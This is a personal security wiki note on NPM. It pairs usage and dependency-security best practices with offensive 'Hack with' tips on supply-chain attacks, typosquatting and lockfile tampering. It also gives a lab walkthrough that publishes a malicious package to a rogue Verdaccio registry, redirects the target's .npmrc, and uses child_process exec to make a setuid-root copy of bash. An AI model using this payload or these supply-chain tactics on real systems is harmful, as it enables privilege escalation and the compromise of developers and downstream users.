
# NPM

NPM (Node Package Manager) is the packet manager for [[NodeJS]] applications.

General usage:
```bash
npm init -y # Initialise
npm install --save ../Logger
# Verify module installation
node 
> module.paths 
# Link instead of install for large depenedency and development "reasons.."
npm link # to link the module
```

#### Malicious NPM Package

Enumerate vulnerable packages
```bash
# Search a registry
npm search ---registry http://$target:$port
# Install packet to registry
npm install $package --registry $registry
```

[Digital Ocean Node.js Module creation](https://www.digitalocean.com/community/tutorials/how-to-create-a-node-js-module)

Using Verdaccio as an example to create a registry to host packages
```bash
# Example assumes you have access
# Pull the latest version
sudo docker pull verdaccio/verdaccio
# Run -it sudo tty --rm to delete when done, bind port to host
sudo docker run -it --rm --name verdaccio -p 4873:4873  verdaccio/verdaccio
# Update auth and flag that exists for legacy authentication 
nmp adduser --registry http://10.10.10.10 --auth-type=legacy
# cat ~/.npmrc for authToken
# Initialise a Malicious NPM Package
npm init 
# Version > target npm 
# make index.js
'require("child_process").exec("chown root:root /tmp/shell;chmod 4755 /tmp/shell")'

npm login --registry http://10.10.10.10:4873 --auth-type=legacy
npm publish --registry http://10.10.10.10:4873

# Target
# update Target.npmrc 
sed -i 's/127.0.0.1/10.10.14.43/g' /home/kavi/.npmrc
# Copy bash for setuid 
cp /bin/bash /tmp/shell
```


#### NPM Dependency Best Practices plus Hacking and Mitigating

[notes.aliciasykes.com Blog - NPM Dependency Best Practices](https://notes.aliciasykes.com/28300/npm-dependency-security-best-practices):

Check Outdated Depencies
```bash
yarn outdated
npx npm-check # --update update as you check..
```
Hack with: Patch level, dork exploits and craft your own if you have too.

Remove Unused Packages - `npx` [GitHub depcheck](https://github.com/depcheck/depcheck)
```bash
npx depcheck
yarn dedup
```
Hack with: if it ain't in use it is not managed and probably misconfigured

Audit Package Security - [[Snyk]] `test`
```
yarn audit
yarn audit fix
```
Hack with: Auditing with just with tools is not really audit, go the extra mile

Migrate and use other well maintained packages; `lissy93`: *""Stats" section of the npm’s package page, or using [npm-stat.com](https://npm-stat.com/) for historic download data"*
Hack with: malicious `npm` should try to be small if you are there to persist

Analyse package size to manage bloat with [Bundlephobia](https://bundlephobia.com/) or:
```
npx cost-of-modules
```
Hack with: malicious `npm` should try to be small if you are there to persist

Respecting Package Licenses 
```
npx license-checker
```
Hack with: if there are GPL or MIT license then you do not need to ask for demo software and its FOSS so download and perform static and dynamic analysis

Ignore Run Scripts
```bash
echo "ignore-scripts" | tee *.nmprc
```
Hack with: people are more likely to be lazy and not read these, check permissions as if they are used through continuously minor versions there is `+wrx`, which guaranteed root /system dance. 

Package Health Checks
```
npm doctor
```
This does the following:
- Check the official `npm` registry is reachable, and display the currently configured registry.
- Check that Git is available.
- Review installed `npm` and Node.js versions.
- Run permission checks on the various folders such as the local and global `node_modules`, and on the folder used for package cache.
- Check the local `npm` module cache for checksum correctness.
Hack with: if persisting in a module the main issue is with how checksums are handled, can you file tamper their checksums? 

New Packages:
- When was it last updated?
- How often are releases published?
- How many developers have contributed to it? (More is better, as there is a lower risk of the project being abandoned, and a higher chance that issues are spotted).
- How many open issues are there?
- Does it have a security policy?
- Any open or recent security advisories?
- Is it correctly using semantic versioning?
- Is it thoroughly tested?
- Does it use many additional dependencies? If so, are they to be deemed trustworthy?
- How many other projects rely on it?
- Is it frequently downloaded? (Check the "Stats" section of the NPM page, or use [npm-stat.com](https://npm-stat.com/))
- Is the code clear and readable? If it is, then issues will be much easier to spot
- Is the license compatible with your project, and have you acknowledged the terms (e.g. attribution)
- How large is the package? And how will this affect your project's bundle size
Hack with: [[Software-Supply-Chain-Attacks]]

Strict installs
```
npm ci
yarn install --frozen-lockfile
```
Hack with: fix their buggy JavaScript for them so they do not find your code with this tool

Lockfiles
```
yan.lock
npm-lock.json
```
Hack with: Social Engineer a Supply Chain attack thorough ultimately targeting at some point these Lockfiles that will be controlled by committee, **do not tamper they backed to cloud repos like git**   

Registry 
[Verdaccio](https://github.com/verdaccio/verdaccio)
Hack with: see Malicious NPM Package

Dependency Inversion Principle
- Writing small, maintainable, tested, single-purpose packages by SOLID Principles 
Hack with: Supply chain attack no the communal issues of using SOLID and DRY code, i.e invent or hijack the wrapper used to do some level lower task to fit with some original target... Primagen (NPM dev ..btw) comments on this principle of DRY and SOLID being bad in this way 

Secure your NPM Accoun
- Proper Authentication
Hack with: Authentication attacks specifically OSINTable passwords, Developers blog and share a lot that could end up being part of a password, or them or their automation with [[Coerced-Authentication]].

Typo-squatting Attacks
Protect with 
- Take care when copying and pasting commands into the terminal and always verify the source of the repo that you are installing via `npm info`.
- Default to having an npm logged-out user in your daily work routines so your credentials won’t be the weak spot that would lead to easily compromising your account.
- Consider appending the `--ignore-script` flag when installing packages, to prevent them from executing arbitrary code.
Hack with: Depending on target make sure the entire package is full of a different alphabet, if you must Typo-squat attack the buffers for editors like vim, emac, vs-code, Linux generally such that on *paste* is also *execute* `joke: exec(*char i, int 66, order []char)` 

More `Lissy93` Tips and Tricks:
- Use any NPM CLI package, without having to first install it, using `npx`
- While developing multiple packages simultaneously, [yarn link](https://classic.yarnpkg.com/en/docs/cli/link/) is useful for creating symbolic links between them
- Due to how NPM dependencies are structured, if you've been working on a lot of projects, you can find your disk space frequently running low. [NPKill](https://npkill.js.org/) is a handy CLI util, to find all node_modules directories for easy deletion of the ones you no longer need. Just run `npx npkill` to get started. You can also [do this nativley](https://listed.to/@lissy93/16988/how-to-remove-all-node_modules-folders)
- To open the GitHub page for any package, just run `npm docs [package-name]`
- If your facing any issues with NPM, then running `npm doctor` with troubleshoot common issues, and output the likely fix
- List all installed packages in a tree structure with `npm ls`
- Many of the NPM short commands can be grouped together, for example `npm cit` is the same as fresh install and run tests
- When working with mono-repos or multiple packages, you can use the `--prefix [./path/to/dir]` flag to run NPM commands in other directories, without having to cd
- To view all valid release versions of a given package, run `npm view [package-name] versions`, or `yarn info [package-name] versions`
- View a tree of dependencies for any package, with [npmgraph.js.org](https://npmgraph.js.org/)
- Use different NPM versions for different projects easily with [Volta](https://volta.sh/)
- More info can be found for any CVE via [cvedetails.com](https://www.cvedetails.com/) or using [GitHub Advisories](https://github.com/advisories).
## References

[Digital Ocean Node.js Module creation](https://www.digitalocean.com/community/tutorials/how-to-create-a-node-js-module)
[notes.aliciasykes.com Blog - NPM Dependency Best Practices](https://notes.aliciasykes.com/28300/npm-dependency-security-best-practices)
[GitHub depcheck](https://github.com/depcheck/depcheck)
[Bundlephobia](https://bundlephobia.com/)